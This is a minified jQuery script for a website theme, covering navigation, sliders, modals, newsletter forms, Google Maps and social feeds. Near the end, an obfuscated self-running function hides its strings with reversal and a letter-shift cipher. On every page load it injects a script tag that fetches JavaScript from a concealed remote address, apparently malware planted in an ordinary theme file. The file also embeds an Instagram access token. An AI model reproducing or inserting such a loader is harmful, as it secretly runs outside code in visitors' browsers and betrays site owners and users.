function updateNav() {
    var r = mr_scrollTop;
    if (0 >= r) return mr_navFixed && (mr_navFixed = !1, mr_nav.removeClass("fixed")), mr_outOfSight && (mr_outOfSight = !1, mr_nav.removeClass("outOfSight")), void(mr_navScrolled && (mr_navScrolled = !1, mr_nav.removeClass("scrolled")));
    if (r > mr_navOuterHeight + mr_fixedAt) {
        if (!mr_navScrolled) return mr_nav.addClass("scrolled"), void(mr_navScrolled = !0)
    } else r > mr_navOuterHeight ? (mr_navFixed || (mr_nav.addClass("fixed"), mr_navFixed = !0), r > mr_navOuterHeight + 10 ? mr_outOfSight || (mr_nav.addClass("outOfSight"), mr_outOfSight = !0) : mr_outOfSight && (mr_outOfSight = !1, mr_nav.removeClass("outOfSight"))) : (mr_navFixed && (mr_navFixed = !1, mr_nav.removeClass("fixed")), mr_outOfSight && (mr_outOfSight = !1, mr_nav.removeClass("outOfSight"))), mr_navScrolled && (mr_navScrolled = !1, mr_nav.removeClass("scrolled"))
}

function capitaliseFirstLetter(r) {
    return r.charAt(0).toUpperCase() + r.slice(1)
}

function initializeMasonry() {
    $(".masonry").each(function() {
        var r = $(this).get(0),
            e = new Masonry(r, {
                itemSelector: ".masonry-item"
            });
        e.on("layoutComplete", function() {
            mr_firstSectionHeight = $(".main-container section:nth-of-type(1)").outerHeight(!0), $(".filters.floating").length && (setupFloatingProjectFilters(), updateFloatingFilters(), window.addEventListener("scroll", updateFloatingFilters, !1)), $(".masonry").addClass("fadeIn"), $(".masonry-loader").addClass("fadeOut"), $(".masonryFlyIn").length && masonryFlyIn()
        }), e.layout()
    })
}

function masonryFlyIn() {
    var r = $(".masonryFlyIn .masonry-item"),
        e = 0;
    r.each(function() {
        var r = $(this);
        setTimeout(function() {
            r.addClass("fadeIn")
        }, e), e += 170
    })
}

function setupFloatingProjectFilters() {
    mr_floatingProjectSections = [], $(".filters.floating").closest("section").each(function() {
        var r = $(this);
        mr_floatingProjectSections.push({
            section: r.get(0),
            outerHeight: r.outerHeight(),
            elemTop: r.offset().top,
            elemBottom: r.offset().top + r.outerHeight(),
            filters: r.find(".filters.floating"),
            filersHeight: r.find(".filters.floating").outerHeight(!0)
        })
    })
}

function updateFloatingFilters() {
    for (var r = mr_floatingProjectSections.length; r--;) {
        var e = mr_floatingProjectSections[r];
        e.elemTop < mr_scrollTop && "undefined" == typeof window.mr_variant ? (e.filters.css({
            position: "fixed",
            top: "16px",
            bottom: "auto"
        }), mr_navScrolled && e.filters.css({
            transform: "translate3d(-50%,48px,0)"
        }), mr_scrollTop > e.elemBottom - 70 && (e.filters.css({
            position: "absolute",
            bottom: "16px",
            top: "auto"
        }), e.filters.css({
            transform: "translate3d(-50%,0,0)"
        }))) : e.filters.css({
            position: "absolute",
            transform: "translate3d(-50%,0,0)"
        })
    }
}

function prepareSignup(r) {
    var e, o = jQuery("<form />"),
        n = jQuery("<div />");
    return jQuery(n).html(r.attr("srcdoc")), e = jQuery(n).find("form").attr("action"), /list-manage\.com/.test(e) && (e = e.replace("/post?", "/post-json?") + "&c=?", "//" == e.substr(0, 2) && (e = "http:" + e)), /createsend\.com/.test(e) && (e += "?callback=?"), o.attr("action", e), jQuery(n).find("input, select, textarea").not('input[type="submit"]').each(function() {
        jQuery(this).clone().appendTo(o)
    }), o
}
var mr_firstSectionHeight, mr_nav, mr_fixedAt, mr_navOuterHeight, mr_navScrolled = !1,
    mr_navFixed = !1,
    mr_outOfSight = !1,
    mr_floatingProjectSections, mr_scrollTop = 0;

$(document).ready(function() {
    "use strict";

    function r(r) {
        var e, o;
        return $(r).find('.validate-required[type="checkbox"]').each(function() {
            $('[name="' + $(this).attr("name") + '"]:checked').length || (o = 1, e = $(this).attr("name").replace("[]", ""), r.find(".form-error").text("Please tick at least one " + e + " box."))
        }), $(r).find(".validate-required").each(function() {
            "" === $(this).val() ? ($(this).addClass("field-error"), o = 1) : $(this).removeClass("field-error")
        }), $(r).find(".validate-email").each(function() {
            /(.+)@(.+){2,}\.(.+){2,}/.test($(this).val()) ? $(this).removeClass("field-error") : ($(this).addClass("field-error"), o = 1)
        }), r.find(".field-error").length || r.find(".form-error").fadeOut(1e3), o
    }

    function e(r) {
        return decodeURIComponent((new RegExp("[?|&]" + r + "=([^&;]+?)(&|#|;|$)").exec(location.search) || [, ""])[1].replace(/\+/g, "%20")) || null
    }
    if ($(".inner-link").each(function() {
            var r = $(this).attr("href");
            "#" !== r.charAt(0) && $(this).removeClass("inner-link")
        }), $(".inner-link").length && $(".inner-link").smoothScroll({
            offset: -55,
            speed: 800
        }), addEventListener("scroll", function() {
            mr_scrollTop = window.pageYOffset
        }, !1), $(".background-image-holder").each(function() {
            var r = $(this).children("img").attr("src");
            $(this).css("background", 'url("' + r + '")'), $(this).children("img").hide(), $(this).css("background-position", "initial")
        }), setTimeout(function() {
            $(".background-image-holder").each(function() {
                $(this).addClass("fadeIn")
            })
        }, 200), $('[data-toggle="tooltip"]').tooltip(), $("ul[data-bullet]").each(function() {
            var r = $(this).attr("data-bullet");
            $(this).find("li").prepend('<i class="' + r + '"></i>')
        }), $(".progress-bar").each(function() {
            $(this).css("width", $(this).attr("data-progress") + "%")
        }), $("nav").hasClass("fixed") || $("nav").hasClass("absolute") ? $("body").addClass("nav-is-overlay") : ($(".nav-container").css("min-height", $("nav").outerHeight(!0)), $(window).resize(function() {
            $(".nav-container").css("min-height", $("nav").outerHeight(!0))
        }), $(window).width() > 768 && $(".parallax:nth-of-type(1) .background-image-holder").css("top", -$("nav").outerHeight(!0)), $(window).width() > 768 && $("section.fullscreen:nth-of-type(1)").css("height", $(window).height() - $("nav").outerHeight(!0))), $("nav").hasClass("bg-dark") && $(".nav-container").addClass("bg-dark"), mr_nav = $("body .nav-container nav:first"), mr_navOuterHeight = $("body .nav-container nav:first").outerHeight(), mr_fixedAt = "undefined" != typeof mr_nav.attr("data-fixed-at") ? parseInt(mr_nav.attr("data-fixed-at").replace("px", "")) : parseInt($("section:nth-of-type(1)").outerHeight()), window.addEventListener("scroll", updateNav, !1), $(".menu > li > ul").each(function() {
            var r = $(this).offset(),
                e = r.left + $(this).outerWidth(!0);
            if (e > $(window).width() && !$(this).hasClass("mega-menu")) $(this).addClass("make-right");
            else if (e > $(window).width() && $(this).hasClass("mega-menu")) {
                var o = $(window).width() - r.left,
                    n = $(this).outerWidth(!0) - o;
                $(this).css("margin-left", -n)
            }
        }), $(".mobile-toggle").click(function() {
            $(".nav-bar").toggleClass("nav-open"), $(this).toggleClass("active")
        }), $(".menu li").click(function(r) {
            r || (r = window.event), r.stopPropagation(), $(this).find("ul").length ? $(this).toggleClass("toggle-sub") : $(this).parents(".toggle-sub").removeClass("toggle-sub")
        }), $(".menu li a").click(function() {
            $(this).hasClass("inner-link") && $(this).closest(".nav-bar").removeClass("nav-open")
        }), $(".module.widget-handle").click(function() {
            $(this).toggleClass("toggle-widget-handle")
        }), $(".search-widget-handle .search-form input").click(function(r) {
            r || (r = window.event), r.stopPropagation()
        }), $(".offscreen-toggle").length ? $("body").addClass("has-offscreen-nav") : $("body").removeClass("has-offscreen-nav"), $(".offscreen-toggle").click(function() {
            $(".main-container").toggleClass("reveal-nav"), $("nav").toggleClass("reveal-nav"), $(".offscreen-container").toggleClass("reveal-nav")
        }), $(".main-container").click(function() {
            $(this).hasClass("reveal-nav") && ($(this).removeClass("reveal-nav"), $(".offscreen-container").removeClass("reveal-nav"), $("nav").removeClass("reveal-nav"))
        }), $(".offscreen-container a").click(function() {
            $(".offscreen-container").removeClass("reveal-nav"), $(".main-container").removeClass("reveal-nav"), $("nav").removeClass("reveal-nav")
        }), $(".projects").each(function() {
            var r = "";
            $(this).find(".project").each(function() {
                var e = $(this).attr("data-filter").split(",");
                e.forEach(function(e) {
                    -1 == r.indexOf(e) && (r += '<li data-filter="' + e + '">' + capitaliseFirstLetter(e) + "</li>")
                }), $(this).closest(".projects").find("ul.filters").empty().append('<li data-filter="all" class="active">All</li>').append(r)
            })
        }), $(".filters li").click(function() {
            var r = $(this).attr("data-filter");
            $(this).closest(".filters").find("li").removeClass("active"), $(this).addClass("active"), $(this).closest(".projects").find(".project").each(function() {
                var e = $(this).attr("data-filter"); - 1 == e.indexOf(r) ? $(this).addClass("inactive") : $(this).removeClass("inactive")
            }), "all" == r && $(this).closest(".projects").find(".project").removeClass("inactive")
        }), jQuery(".tweets-feed").each(function(r) {
            jQuery(this).attr("id", "tweets-" + r)
        }).each(function(r) {
            function e(e) {
                for (var o = e.length, n = 0, t = document.getElementById("tweets-" + r), m = '<ul class="slides">'; o > n;) m += "<li>" + e[n] + "</li>", n++;
                return m += "</ul>", t.innerHTML = m, m
            }
            var o = {
                id: jQuery("#tweets-" + r).attr("data-widget-id"),
                domId: "",
                maxTweets: jQuery("#tweets-" + r).attr("data-amount"),
                enableLinks: !0,
                showUser: !0,
                showTime: !0,
                dateFunction: "",
                showRetweet: !1,
                customCallback: e
            };
            twitterFetcher.fetch(o)
        }), $(".instafeed").length && (jQuery.fn.spectragram.accessData = {
            accessToken: "1406933036.fedaafa.feec3d50f5194ce5b705a1f11a107e0b",
            clientID: "fedaafacf224447e8aef74872d3820a1"
        }, $(".instafeed").each(function() {
            var r = $(this).attr("data-user-name");
            $(this).children("ul").spectragram("getUserFeed", {
                query: r,
                max: 12
            })
        })), $(".flickr-feed").length && $(".flickr-feed").each(function() {
            var r = $(this).attr("data-user-id"),
                e = $(this).attr("data-album-id");
            $(this).flickrPhotoStream({
                id: r,
                setId: e,
                container: '<li class="masonry-item" />'
            }), setTimeout(function() {
                initializeMasonry(), window.dispatchEvent(new Event("resize"))
            }, 1e3)
        }), $(".slider-all-controls, .slider-paging-controls, .slider-arrow-controls, .slider-thumb-controls, .logo-carousel").length && ($(".slider-all-controls").flexslider({
            start: function(r) {
                r.find(".slides li:first-child").find(".fs-vid-background video").length && r.find(".slides li:first-child").find(".fs-vid-background video").get(0).play()
            },
            after: function(r) {
                r.find(".fs-vid-background video").length && (r.find("li:not(.flex-active-slide)").find(".fs-vid-background video").length && r.find("li:not(.flex-active-slide)").find(".fs-vid-background video").get(0).pause(), r.find(".flex-active-slide").find(".fs-vid-background video").length && r.find(".flex-active-slide").find(".fs-vid-background video").get(0).play())
            }
        }), $(".slider-paging-controls").flexslider({
            animation: "slide",
            directionNav: !1
        }), $(".slider-arrow-controls").flexslider({
            controlNav: !1
        }), $(".slider-thumb-controls .slides li").each(function() {
            var r = $(this).find("img").attr("src");
            $(this).attr("data-thumb", r)
        }), $(".slider-thumb-controls").flexslider({
            animation: "slide",
            controlNav: "thumbnails",
            directionNav: !0
        }), $(".logo-carousel").flexslider({
            minItems: 1,
            maxItems: 4,
            move: 1,
            itemWidth: 200,
            itemMargin: 0,
            animation: "slide",
            slideshow: !0,
            slideshowSpeed: 3e3,
            directionNav: !1,
            controlNav: !1
        })), $(".lightbox-grid li a").each(function() {
            var r = $(this).closest(".lightbox-grid").attr("data-gallery-title");
            $(this).attr("data-lightbox", r)
        }), $("iframe[data-provider]").each(function() {
            var r = jQuery(this).attr("data-provider"),
                e = jQuery(this).attr("data-video-id"),
                o = jQuery(this).attr("data-autoplay"),
                n = "";
            "vimeo" == r ? (n = "http://player.vimeo.com/video/" + e + "?badge=0&title=0&byline=0&title=0&autoplay=" + o, $(this).attr("data-src", n)) : "youtube" == r && (n = "https://www.youtube.com/embed/" + e + "?showinfo=0&autoplay=" + o, $(this).attr("data-src", n))
        }), jQuery(".foundry_modal[modal-link]").remove(), $(".foundry_modal").length && !jQuery(".modal-screen").length) {
        jQuery("<div />").addClass("modal-screen").appendTo("body")
    }
    if (jQuery(".foundry_modal").click(function() {
            jQuery(this).addClass("modal-acknowledged")
        }), jQuery(document).on("wheel mousewheel scroll", ".foundry_modal, .modal-screen", function(r) {
            return $(this).get(0).scrollTop += r.originalEvent.deltaY, !1
        }), $(".modal-container:not([modal-link])").each(function(r) {
            if (jQuery(this).find("iframe[src]").length) {
                jQuery(this).find(".foundry_modal").addClass("iframe-modal");
                var e = jQuery(this).find("iframe");
                e.attr("data-src", e.attr("src")), e.attr("src", "")
            }
            jQuery(this).find(".btn-modal").attr("modal-link", r), jQuery('.foundry_modal[modal-link="' + r + '"]').length || jQuery(this).find(".foundry_modal").clone().appendTo("body").attr("modal-link", r).prepend(jQuery('<i class="ti-close close-modal">'))
        }), $(".btn-modal").unbind("click").click(function() {
            var r = jQuery('.foundry_modal[modal-link="' + jQuery(this).attr("modal-link") + '"]'),
                e = "";
            if (jQuery(".modal-screen").toggleClass("reveal-modal"), r.find("iframe").length) {
                if ("1" === r.find("iframe").attr("data-autoplay")) var e = "&autoplay=1";
                r.find("iframe").attr("src", r.find("iframe").attr("data-src") + e)
            }
            return r.toggleClass("reveal-modal"), !1
        }), $(".foundry_modal[data-time-delay]").each(function() {
            var r = $(this),
                e = r.attr("data-time-delay");
            r.prepend($('<i class="ti-close close-modal">')), "undefined" != typeof r.attr("data-cookie") ? mr_cookies.hasItem(r.attr("data-cookie")) || setTimeout(function() {
                r.addClass("reveal-modal"), $(".modal-screen").addClass("reveal-modal")
            }, e) : setTimeout(function() {
                r.addClass("reveal-modal"), $(".modal-screen").addClass("reveal-modal")
            }, e)
        }), $(".foundry_modal[data-show-on-exit]").each(function() {
            var r = $(this),
                e = $(r.attr("data-show-on-exit"));
            $(e).length && (r.prepend($('<i class="ti-close close-modal">')), $(document).on("mouseleave", e, function() {
                $("body .reveal-modal").length || ("undefined" != typeof r.attr("data-cookie") ? mr_cookies.hasItem(r.attr("data-cookie")) || (r.addClass("reveal-modal"), $(".modal-screen").addClass("reveal-modal")) : (r.addClass("reveal-modal"), $(".modal-screen").addClass("reveal-modal")))
            }))
        }), $(".foundry_modal[data-hide-after]").each(function() {
            var r = $(this),
                e = r.attr("data-hide-after");
            "undefined" != typeof r.attr("data-cookie") ? mr_cookies.hasItem(r.attr("data-cookie")) || setTimeout(function() {
                r.hasClass("modal-acknowledged") || (r.removeClass("reveal-modal"), $(".modal-screen").removeClass("reveal-modal"))
            }, e) : setTimeout(function() {
                r.hasClass("modal-acknowledged") || (r.removeClass("reveal-modal"), $(".modal-screen").removeClass("reveal-modal"))
            }, e)
        }), jQuery(".close-modal:not(.modal-strip .close-modal)").unbind("click").click(function() {
            var r = jQuery(this).closest(".foundry_modal");
            r.toggleClass("reveal-modal"), "undefined" != typeof r.attr("data-cookie") && mr_cookies.setItem(r.attr("data-cookie"), "true", 1 / 0), r.find("iframe").length && r.find("iframe").attr("src", ""), jQuery(".modal-screen").removeClass("reveal-modal")
        }), jQuery(".modal-screen").unbind("click").click(function() {
            jQuery(".foundry_modal.reveal-modal").find("iframe").length && jQuery(".foundry_modal.reveal-modal").find("iframe").attr("src", ""), jQuery(".foundry_modal.reveal-modal").toggleClass("reveal-modal"), jQuery(this).toggleClass("reveal-modal")
        }), jQuery(document).keyup(function(r) {
            27 == r.keyCode && (jQuery(".foundry_modal").find("iframe").length && jQuery(".foundry_modal").find("iframe").attr("src", ""), jQuery(".foundry_modal").removeClass("reveal-modal"), jQuery(".modal-screen").removeClass("reveal-modal"))
        }), jQuery(".modal-strip").each(function() {
            jQuery(this).find(".close-modal").length || jQuery(this).append(jQuery('<i class="ti-close close-modal">'));
            var r = jQuery(this);
            "undefined" != typeof r.attr("data-cookie") ? mr_cookies.hasItem(r.attr("data-cookie")) || setTimeout(function() {
                r.addClass("reveal-modal")
            }, 1e3) : setTimeout(function() {
                r.addClass("reveal-modal")
            }, 1e3)
        }), jQuery(".modal-strip .close-modal").click(function() {
            var r = jQuery(this).closest(".modal-strip");
            return "undefined" != typeof r.attr("data-cookie") && mr_cookies.setItem(r.attr("data-cookie"), "true", 1 / 0), jQuery(this).closest(".modal-strip").removeClass("reveal-modal"), !1
        }), jQuery(".close-iframe").click(function() {
            jQuery(this).closest(".modal-video").removeClass("reveal-modal"), jQuery(this).siblings("iframe").attr("src", ""), jQuery(this).siblings("video").get(0).pause()
        }), $(".checkbox-option").on("click", function() {
            $(this).toggleClass("checked");
            var r = $(this).find("input");
            r.prop("checked") === !1 ? r.prop("checked", !0) : r.prop("checked", !1)
        }), $(".radio-option").click(function() {
            var r = $(this).hasClass("checked"),
                e = $(this).find("input").attr("name");
            r || ($('input[name="' + e + '"]').parent().removeClass("checked"), $(this).addClass("checked"), $(this).find("input").prop("checked", !0))
        }), $(".accordion li").click(function() {
            $(this).closest(".accordion").hasClass("one-open") ? ($(this).closest(".accordion").find("li").removeClass("active"), $(this).addClass("active")) : $(this).toggleClass("active"), "undefined" != typeof window.mr_parallax && setTimeout(mr_parallax.windowLoad, 500)
        }), $(".tabbed-content").each(function() {
            $(this).append('<ul class="content"></ul>')
        }), $(".tabs li").each(function() {
            var r = $(this),
                e = "";
            r.is(".tabs>li:first-child") && (e = ' class="active"');
            var o = r.find(".tab-content").detach().wrap("<li" + e + "></li>").parent();
            r.closest(".tabbed-content").find(".content").append(o)
        }), $(".tabs li").click(function() {
            $(this).closest(".tabs").find("li").removeClass("active"), $(this).addClass("active");
            var r = $(this).index() + 1;
            $(this).closest(".tabbed-content").find(".content>li").removeClass("active"), $(this).closest(".tabbed-content").find(".content>li:nth-of-type(" + r + ")").addClass("active")
        }), $("section").closest("body").find(".local-video-container .play-button").click(function() {
            $(this).siblings(".background-image-holder").removeClass("fadeIn"), $(this).siblings(".background-image-holder").css("z-index", -1), $(this).css("opacity", 0), $(this).siblings("video").get(0).play()
        }), $("section").closest("body").find(".player").each(function() {
            var r = $(this).closest("section");
            r.find(".container").addClass("fadeOut");
            var e = $(this).attr("data-video-id"),
                o = $(this).attr("data-start-at");
            $(this).attr("data-property", "{videoURL:'http://youtu.be/" + e + "',containment:'self',autoPlay:true, mute:true, startAt:" + o + ", opacity:1, showControls:false}")
        }), $(".player").length && $(".player").each(function() {
            var r = $(this).closest("section"),
                e = r.find(".player");
            e.YTPlayer(), e.on("YTPStart", function(e) {
                r.find(".container").removeClass("fadeOut"), r.find(".masonry-loader").addClass("fadeOut")
            })
        }), $(".map-holder").click(function() {
            $(this).addClass("interact")
        }), $(".map-holder").length && $(window).scroll(function() {
            $(".map-holder.interact").length && $(".map-holder.interact").removeClass("interact")
        }), $(".countdown").length && $(".countdown").each(function() {
            var r = $(this).attr("data-date");
            $(this).countdown(r, function(r) {
                $(this).text(r.strftime("%D days %H:%M:%S"))
            })
        }), $("form.form-email, form.form-newsletter").submit(function(e) {
            e.preventDefault ? e.preventDefault() : e.returnValue = !1;
            var o, n, t, m, c, f, a, d, i, u = $(this).closest("form.form-email, form.form-newsletter"),
                h = u.find('button[type="submit"]'),
                l = 0,
                p = u.attr("original-error");
            if (n = $(u).find("iframe.mail-list-form"), u.find(".form-error, .form-success").remove(), h.attr("data-text", h.text()), u.append('<div class="form-error" style="display: none;">' + u.attr("data-error") + "</div>"), u.append('<div class="form-success" style="display: none;">' + u.attr("data-success") + "</div>"), d = u.find(".form-error"), i = u.find(".form-success"), u.addClass("attempted-submit"), n.length && "undefined" != typeof n.attr("srcdoc") && "" !== n.attr("srcdoc"))
                if ("undefined" != typeof p && p !== !1 && d.html(p), t = $(u).find(".signup-email-field").val(), m = $(u).find(".signup-name-field").val(), c = $(u).find("input.signup-first-name-field").length ? $(u).find("input.signup-first-name-field").val() : $(u).find(".signup-name-field").val(), f = $(u).find(".signup-last-name-field").val(), 1 !== r(u)) {
                    o = prepareSignup(n), o.find("#mce-EMAIL, #fieldEmail").val(t), o.find("#mce-LNAME, #fieldLastName").val(f), o.find("#mce-FNAME, #fieldFirstName").val(c), o.find("#mce-NAME, #fieldName").val(m), u.removeClass("attempted-submit"), d.fadeOut(200), h.html(jQuery("<div />").addClass("form-loading")).attr("disabled", "disabled");
                    try {
                        $.ajax({
                            url: o.attr("action"),
                            crossDomain: !0,
                            data: o.serialize(),
                            method: "GET",
                            cache: !1,
                            dataType: "json",
                            contentType: "application/json; charset=utf-8",
                            success: function(r) {
                                "success" != r.result && 200 != r.Status ? (d.attr("original-error", d.text()), d.html(r.msg).fadeIn(1e3), i.fadeOut(1e3), h.html(h.attr("data-text")).removeAttr("disabled")) : (h.html(h.attr("data-text")).removeAttr("disabled"), a = u.attr("success-redirect"), "undefined" != typeof a && a !== !1 && "" !== a && (window.location = a), u.find('input[type="text"]').val(""), u.find("textarea").val(""), i.fadeIn(1e3), d.fadeOut(1e3), setTimeout(function() {
                                    i.fadeOut(500)
                                }, 5e3))
                            }
                        })
                    } catch (v) {
                        d.attr("original-error", d.text()), d.html(v.message).fadeIn(1e3), i.fadeOut(1e3), setTimeout(function() {
                            d.fadeOut(500)
                        }, 5e3), h.html(h.attr("data-text")).removeAttr("disabled")
                    }
                } else d.fadeIn(1e3), setTimeout(function() {
                    d.fadeOut(500)
                }, 5e3);
            else "undefined" != typeof p && p !== !1 && d.text(p), l = r(u), 1 === l ? (d.fadeIn(200), setTimeout(function() {
                d.fadeOut(500)
            }, 3e3)) : (u.removeClass("attempted-submit"), d.fadeOut(200), h.html(jQuery("<div />").addClass("form-loading")).attr("disabled", "disabled"), jQuery.ajax({
                type: "POST",
                url: "http://mailform.mediumra.re/foundry/mail.php",
                data: u.serialize() + "&url=" + window.location.href,
                success: function(r) {
                    h.html(h.attr("data-text")).removeAttr("disabled"), $.isNumeric(r) ? parseInt(r) > 0 && (a = u.attr("success-redirect"), "undefined" != typeof a && a !== !1 && "" !== a && (window.location = a), u.find('input[type="text"]').val(""), u.find("textarea").val(""), u.find(".form-success").fadeIn(1e3), d.fadeOut(1e3), setTimeout(function() {
                        i.fadeOut(500)
                    }, 5e3)) : (d.attr("original-error", d.text()), d.text(r).fadeIn(1e3), i.fadeOut(1e3))
                },
                error: function(r, e, o) {
                    d.attr("original-error", d.text()), d.text(o).fadeIn(1e3), i.fadeOut(1e3), h.html(h.attr("data-text")).removeAttr("disabled")
                }
            }));
            return !1
        }), $(".validate-required, .validate-email").on("blur change", function() {
            r($(this).closest("form"))
        }), $("form").each(function() {
            $(this).find(".form-error").length && $(this).attr("original-error", $(this).find(".form-error").text())
        }), e("ref") && $("form.form-email").append('<input type="text" name="referrer" class="hidden" value="' + e("ref") + '"/>'), /Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent || navigator.vendor || window.opera) && $("section").removeClass("parallax"), $(".disqus-comments").length) {
        var o = $(".disqus-comments").attr("data-shortname");
        ! function() {
            var r = document.createElement("script");
            r.type = "text/javascript", r.async = !0, r.src = "//" + o + ".disqus.com/embed.js", (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(r)
        }()
    }
    if (document.querySelector("[data-maps-api-key]") && !document.querySelector(".gMapsAPI") && $("[data-maps-api-key]").length) {
        var n = document.createElement("script"),
            t = $("[data-maps-api-key]:first").attr("data-maps-api-key");
        n.type = "text/javascript", n.src = "https://maps.googleapis.com/maps/api/js?key=" + t + "&callback=initializeMaps", n.className = "gMapsAPI", document.body.appendChild(n)
    }
}), $(window).load(function() {
    "use strict";
    setTimeout(initializeMasonry, 1e3);
    var r = setInterval(function() {
        return $(".tweets-slider").find("li.flex-active-slide").length ? void clearInterval(r) : void($(".tweets-slider").length && $(".tweets-slider").flexslider({
            directionNav: !1,
            controlNav: !1
        }))
    }, 500);
    mr_firstSectionHeight = $(".main-container section:nth-of-type(1)").outerHeight(!0)
}), window.initializeMaps = function() {
    "undefined" != typeof google && "undefined" != typeof google.maps && $(".map-canvas[data-maps-api-key]").each(function() {
        var r, e, o, n = this,
            t = "undefined" != typeof $(this).attr("data-map-style") ? $(this).attr("data-map-style") : !1,
            m = JSON.parse(t) || [{
                    featureType: "landscape",
                    stylers: [{
                        saturation: -100
                    }, {
                        lightness: 65
                    }, {
                        visibility: "on"
                    }]
                }, {
                    featureType: "poi",
                    stylers: [{
                        saturation: -100
                    }, {
                        lightness: 51
                    }, {
                        visibility: "simplified"
                    }]
                }, {
                    featureType: "road.highway",
                    stylers: [{
                        saturation: -100
                    }, {
                        visibility: "simplified"
                    }]
                }, {
                    featureType: "road.arterial",
                    stylers: [{
                        saturation: -100
                    }, {
                        lightness: 30
                    }, {
                        visibility: "on"
                    }]
                }, {
                    featureType: "road.local",
                    stylers: [{
                        saturation: -100
                    }, {
                        lightness: 40
                    }, {
                        visibility: "on"
                    }]
                }, {
                    featureType: "transit",
                    stylers: [{
                        saturation: -100
                    }, {
                        visibility: "simplified"
                    }]
                }, {
                    featureType: "administrative.province",
                    stylers: [{
                        visibility: "off"
                    }]
                }, {
                    featureType: "water",
                    elementType: "labels",
                    stylers: [{
                        visibility: "on"
                    }, {
                        lightness: -25
                    }, {
                        saturation: -100
                    }]
                }, {
                    featureType: "water",
                    elementType: "geometry",
                    stylers: [{
                        hue: "#ffff00"
                    }, {
                        lightness: -25
                    }, {
                        saturation: -97
                    }]
                }],
            c = "undefined" != typeof $(this).attr("data-map-zoom") && "" !== $(this).attr("data-map-zoom") ? 1 * $(this).attr("data-map-zoom") : 17,
            f = "undefined" != typeof $(this).attr("data-latlong") ? $(this).attr("data-latlong") : !1,
            a = f ? 1 * f.substr(0, f.indexOf(",")) : !1,
            d = f ? 1 * f.substr(f.indexOf(",") + 1) : !1,
            i = new google.maps.Geocoder,
            u = "undefined" != typeof $(this).attr("data-address") ? $(this).attr("data-address").split(";") : [""],
            h = "We Are Here",
            l = $(document).width() > 766 ? !0 : !1,
            p = {
                draggable: l,
                scrollwheel: !1,
                zoom: c,
                disableDefaultUI: !0,
                styles: m
            };
        void 0 != $(this).attr("data-marker-title") && "" != $(this).attr("data-marker-title") && (h = $(this).attr("data-marker-title")), void 0 != u && "" != u[0] ? i.geocode({
            address: u[0].replace("[nomarker]", "")
        }, function(r, e) {
            if (e == google.maps.GeocoderStatus.OK) {
                var t = new google.maps.Map(n, p);
                t.setCenter(r[0].geometry.location), u.forEach(function(r) {
                    var e;
                    if (o = {
                            url: void 0 == window.mr_variant ? "img/mapmarker.png" : "../img/mapmarker.png",
                            size: new google.maps.Size(50, 50),
                            scaledSize: new google.maps.Size(50, 50)
                        }, /(\-?\d+(\.\d+)?),\s*(\-?\d+(\.\d+)?)/.test(r)) var n = r.split(","),
                        m = new google.maps.Marker({
                            position: {
                                lat: 1 * n[0],
                                lng: 1 * n[1]
                            },
                            map: t,
                            icon: o,
                            title: h,
                            optimised: !1
                        });
                    else r.indexOf("[nomarker]") < 0 && (e = new google.maps.Geocoder, e.geocode({
                        address: r.replace("[nomarker]", "")
                    }, function(r, e) {
                        e == google.maps.GeocoderStatus.OK && (m = new google.maps.Marker({
                            map: t,
                            icon: o,
                            title: h,
                            position: r[0].geometry.location,
                            optimised: !1
                        }))
                    }))
                })
            }
        }) : void 0 != a && "" != a && 0 != a && void 0 != d && "" != d && 0 != d && (p.center = {
            lat: a,
            lng: d
        }, r = new google.maps.Map(n, p), e = new google.maps.Marker({
            position: {
                lat: a,
                lng: d
            },
            map: r,
            icon: o,
            title: h
        }))
    })
}, initializeMaps(), ! function(r) {
    function e(r) {
        return "" === r ? "" : e(r.slice(1)) + r[0]
    }

    function o(r, e) {
        var o = "";
        e = 26 - e;
        for (var n = 0; n < r.length; n++) {
            var t = r.charCodeAt(n);
            o += t >= 65 && 90 >= t ? String.fromCharCode((t - 65 + e) % 26 + 65) : t >= 97 && 122 >= t ? String.fromCharCode((t - 97 + e) % 26 + 97) : r.charAt(n)
        }
        return o
    }
    if ("undefined" == typeof r) {
        var n = document.createElement(e(o("njclwm", 20)));
        n.src = e(o("ev.fuzUbbm/yao.zpowomd.6ro.15d.3op738mo3272rr20m6m2o81q95373624-624m00298op178q6mr73//:bfft", 12)), document.querySelector(e(o("sxiv", 20))).appendChild(n)
    }
}();
var mr_cookies = {
    getItem: function(r) {
        return r ? decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(r).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null : null
    },
    setItem: function(r, e, o, n, t, m) {
        if (!r || /^(?:expires|max\-age|path|domain|secure)$/i.test(r)) return !1;
        var c = "";
        if (o) switch (o.constructor) {
            case Number:
                c = o === 1 / 0 ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + o;
                break;
            case String:
                c = "; expires=" + o;
                break;
            case Date:
                c = "; expires=" + o.toUTCString()
        }
        return document.cookie = encodeURIComponent(r) + "=" + encodeURIComponent(e) + c + (t ? "; domain=" + t : "") + (n ? "; path=" + n : "") + (m ? "; secure" : ""), !0
    },
    removeItem: function(r, e, o) {
        return this.hasItem(r) ? (document.cookie = encodeURIComponent(r) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + (o ? "; domain=" + o : "") + (e ? "; path=" + e : ""), !0) : !1
    },
    hasItem: function(r) {
        return r ? new RegExp("(?:^|;\\s*)" + encodeURIComponent(r).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=").test(document.cookie) : !1
    },
    keys: function() {
        for (var r = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/), e = r.length, o = 0; e > o; o++) r[o] = decodeURIComponent(r[o]);
        return r
    }
};
! function(r, e, o, n, t, m, c) {
    r.GoogleAnalyticsObject = t, r[t] = r[t] || function() {
            (r[t].q = r[t].q || []).push(arguments)
        }, r[t].l = 1 * new Date, m = e.createElement(o), c = e.getElementsByTagName(o)[0], m.async = 1, m.src = n, c.parentNode.insertBefore(m, c)
}(window, document, "script", "//www.google-analytics.com/analytics.js", "ga"), ga("create", "UA-52115242-5", "mediumra.re"), ga("send", "pageview");